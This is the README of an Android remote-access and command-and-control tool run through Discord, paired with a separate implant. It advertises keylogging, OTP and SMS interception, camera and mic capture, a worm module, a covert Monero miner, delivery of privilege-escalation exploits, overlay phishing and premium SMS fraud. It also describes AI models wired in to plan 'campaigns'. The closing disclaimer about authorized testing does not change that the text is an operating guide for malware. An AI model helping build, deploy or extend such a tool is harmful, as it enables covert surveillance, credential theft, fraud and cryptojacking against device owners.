#  SHINSENKYO — Discord C2 Bot

![banner](https://media.tenor.com/pCtCujYcqTT/gabimaru-fire.gif)

> *"Paradise is just another name for a place where you have nothing left to know."*

A Discord-based command & control bot for Android device management. Communicate with and control remote Android devices through Discord channels with real-time feedback, AI assistance, and live screen streaming.

---

## Features

###  Device Control
- **200+ commands** — shell, file manager, screenshot, camera, mic, SMS, contacts, location, clipboard, notifications, clipboard, processes, network, battery, installed apps, and more
- **Multi-device** — manage any number of devices simultaneously, each in its own `phantom-` channel
- **Auto-targeting** — if only one device is online, commands route to it automatically
- **Broadcast mode** — send a command to every connected device at once

###  Live Screen Streaming
- Stream device screen to a Discord text channel as JPEG frames
- Optional Discord voice channel integration
- Configurable FPS (1–10) and resolution
- Auto-cleans old frames — only the latest few frames are kept
- REST API for device-side frame submission

###  AI Co-Pilot
- **FREE** — uses Google Gemini (60 req/min, no credit card needed)
- Multi-provider: supports Gemini, Ollama (local), Claude, NVIDIA
- Context-aware — remembers recent device interactions per session
- Command suggestions, shell command generation, log analysis, campaign planning
- Swarm mode for multi-agent orchestration

###  Campaign Manager
- Plan and execute multi-step operation campaigns
- Track campaign state, objectives, and completion
- Timeline view of all campaign actions

###  File Management
- Full remote file system access: `ls`, `cd`, `cat`, `tree`, `find`, `disk`, `stat`
- File operations: download, upload, delete, move, copy
- Storage overview with usage stats

###  Notification Interception
- Real-time notification capture from target device
- Auto-forward notifications to Discord alerts channel
- OTP / SMS interception

###  Upload & Delivery
- Push files and modules to devices over Discord
- APK upload and sideload delivery
- Module system for extensible payload deployment

###  Worm Module
- Deploy worm module from Supabase storage
- Module lifecycle: load, start, stop, exec
- Encrypted module delivery with IV-prepended GCM

###  Mining
- Built-in Monero miner with pool management
- Start/stop mining remotely
- Mining status and statistics

###  Exploit Framework
- CVE-based exploit delivery (Dirty Pipe, CVE-2019-2215, CVE-2023-0386)
- Auto-pwn and privilege escalation attempt commands

###  Phishing & Social Engineering
- Overlay phishing page deployment
- SMS scam templates
- Premium SMS fraud infrastructure

###  Monitoring & Alerts
- Periodic device health checks (every 5 minutes)
- Online/offline alerts via Discord
- Status cards with online time, battery, IP, device model
- Heartbeat-based liveness detection

###  UI & Presentation
- **Hell's Paradise (Jigokuraku) theme** — void/blood/sakura/tao color palette
- Random anime GIFs from 10 curated Jigokuraku GIFs on every embed
- Paginated device list with navigation buttons
- Rich embeds with inline status indicators

---

## Bot Commands

| Command | Description |
|---------|-------------|
| `!help` | Command reference with categories |
| `!menu` | Control panel with action buttons |
| `!devices` | List all connected devices (paginated) |
| `!target <n>` | Select a device by index |
| `!untarget` | Clear current target |
| `!broadcast <cmd>` | Send command to all devices |
| `!health` | Check bot and connection health |
| `!setavatar` | Change bot avatar to a random GIF |
| `!ai <prompt>` | Ask the AI copilot |
| `!campaign` | Campaign management |
| `!analyze <log>` | Analyze logs with AI |
| `!stream` | Start screen stream to device |
| `!miner` | Crypto mining controls |
| `!upload` | Send files to a device |
| `!module` | Worm module management |

### Device Commands (prefix with `!` or via menu)

`ping`, `info`, `screenshot`, `camera`, `location`, `contacts`, `sms`, `call_log`, `mic`, `clipboard`, `shell`, `keylog`, `status`, `wifi`, `battery`, `processes`, `installed`, `torch`, `vibrate`, `uptime`, `notifications`, `admin`, `overlay`, `click`, `input`, `open`, `screen`, `gesture`, `pin`, `ip`, `stream`, `netstat`, `sysinfo`, `sysprop`, `apps`, `storage`, `grabber`, `record`, `dump`, `exploit`, `autopwn`, `phish`, `blockchain`, `plugin`, `worm`, `brain`, `inject`, `module`, `dir`, `ls`, `tree`, `find`, `cat`, `disk`, `download`, `rm`, `mv`, `cp`, `mkdir`, `packages`, `accounts`, `fcm`, `watchdog`, `keepalive`, `restart`, `debug`, `payload` … and many more

---

## Quick Start

### Prerequisites
- Node.js 18+
- A Discord bot token ([Discord Developer Portal](https://discord.com/developers/applications))
- A Discord server with a channel for commands

### Setup

```bash
git clone https://github.com/aymouo/discord-c2-bot.git
cd discord-c2-bot
cp .env.example .env
```

Edit `.env` with your values:

```
DISCORD_TOKEN=your_bot_token_here
ALLOWED_CHANNEL_ID=your_channel_id_here
CRYPTO_KEY=your_32byte_hex_key
```

Install and run:

```bash
npm install
npm start
```

### Docker

```bash
docker build -t shinsenkyo-bot .
docker run -d --env-file .env shinsenkyo-bot
```

---

## Architecture

```
discord-c2-bot/
├── index.js              # Main bot — commands, events, state
├── stream.js             # Live screen streaming server
├── banner.js             # Console startup banner
├── statusCard.js         # Device status card generator
├── bot/
│   ├── embeds.js         # Embed builders (bloodEmbed, alertEmbed, etc.)
│   ├── formatter.js      # Device data formatters
│   ├── minerEmbed.js     # Mining stats embed
│   └── state.js          # Persistent state store
├── ai-copilot/
│   ├── index.js          # AI provider abstraction
│   ├── controller.js     # Campaign & command analysis
│   ├── relay.js          # Blockchain/IPFS relay
│   ├── context.js        # Session context manager
│   ├── commands.js       # Command definitions
│   └── swarm.js          # Multi-agent swarm mode
├── lib/
│   └── crypto.js         # AES-256-GCM encryption/decryption
├── utils/
│   └── index.js          # Shared constants, helpers, color/emoji maps
├── tools/                # Utility scripts
├── .env.example          # Configuration template
├── gif.txt               # Random GIF pool (Hell's Paradise)
├── icons_gif.txt         # Icon GIFs for embeds
├── BOTMAP.md             # Internal code flow documentation
├── Dockerfile            # Container build
└── railway.json          # Railway deployment config
```

---

## Deployment

Optimized for **Koyeb free tier** — connection watchdog pings every 30s, health check every 2min, auto-reconnect on stale or dropped connections. Also compatible with Railway, Heroku, or any Node.js host.

---

## Configuration

See [`.env.example`](.env.example) for all available options.

- `DISCORD_TOKEN` — Bot token (required)
- `ALLOWED_CHANNEL_ID` — Command channel (required)
- `CRYPTO_KEY` — Encryption key for C2 payloads (required)
- `GEMINI_API_KEY` — Free Google Gemini key for AI features (optional)
- `PORT` — Express server port (default: 8000)
- `ALERTS_CHANNEL_ID` — Separate channel for online/offline alerts (optional)

---

## Related

- [phantom-c2-android](https://github.com/aymouo/phantom-c2-android) — Android implant paired with this bot

---

> **Disclaimer** — This project is for educational and authorized security testing purposes only.
